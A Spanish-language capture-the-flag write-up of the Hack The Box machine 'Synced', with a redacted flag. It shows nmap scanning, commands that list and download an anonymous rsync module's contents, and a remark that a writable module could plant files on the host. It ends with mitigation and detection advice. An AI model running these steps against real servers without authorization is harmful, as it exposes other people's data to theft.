---
machine: Synced
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, rsync, anonymous, file-share]
---

# Synced — Hack The Box

[👑 English](README.en.md) | **Español**

> **Estado:** Available (Starting Point), publicable.
> Ficha de referencia. Sin flags ni credenciales reales.

## TL;DR

**rsync en el 873 con un módulo anónimo**. Se listan los módulos sin credenciales, se baja el contenido del módulo compartido y la flag está en un fichero de texto. Un solo paso: hablar con el servicio con su propia herramienta.

## Reconocimiento

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp   ssh    OpenSSH
873/tcp  rsync  rsync
```

```bash
nmap -p873 --script rsync-list-modules <IP>
```

## Acceso

```bash
rsync rsync://<IP>/            # listar módulos
rsync rsync://<IP>/<modulo>/   # listar el contenido del módulo
rsync -av rsync://<IP>/<modulo>/ ./loot/
```

```text
receiving file list ...
flag.txt
```

```bash
cat loot/flag.txt
```

```text
<flag>
```

Si el módulo permite escritura (`rsync -av ./algo rsync://<IP>/<modulo>/`), el servicio también sería una vía para dejar ficheros en el host.

## Evidencia (redactada)

```text
<modulo>/flag.txt  ->  <flag>
```

## Lecciones

- rsync anónimo equivale a un recurso compartido sin contraseña: lista y descarga todo lo que haya en el módulo.
- Los módulos suelen apuntar a directorios de backups o despliegues, que es donde aparecen secretos.
- Mitigación: `auth users` y `secrets file` en `rsyncd.conf`, `read only = yes` salvo necesidad, ACLs por IP y `use chroot = yes`.
- Detección: conexiones al 873 desde fuera de la red de administración y `@RSYNCD: OK` en el tráfico.
